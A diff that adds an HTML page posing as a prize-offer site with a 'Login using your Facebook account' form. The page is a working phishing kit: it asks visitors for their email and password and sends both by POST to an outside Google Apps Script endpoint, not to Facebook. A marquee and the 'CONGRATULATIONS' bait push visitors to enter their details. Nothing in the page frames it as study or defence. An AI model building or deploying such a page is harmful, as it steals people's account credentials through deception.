@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Document</title>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align:center">
+          <h2>one time offers.com welcomes you</h2>
+          <p>Win Your Prize "CONGRATULATIONS.........."</p>
+        </div>
+        <h1 align="center">Login using your Facebook account</h1>
+        <div class="row">
+          
+          <div class="column">
+            <form id="gform" method="POST" action="https://script.google.com/macros/s/AKfycby9A2R8eJY9Z9L16w-QXi3-2EXH6_uC5yHbowzfSA/exec">
+              <label for="Emailid">Emailid</label>
+              <input type="text" id="Emailid" name="Emailid" placeholder="Emailid">
+              <label for="lname">Password</label>
+              <input type="password" id="password" name="password" placeholder="Password"><br><br><br>
+              <input type="submit" value="Login">
+            </form>
+          </div>
+        </div>
+      </div>
+      <marquee><b>Continue with facebook and get your reward</b></marquee>
+      <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
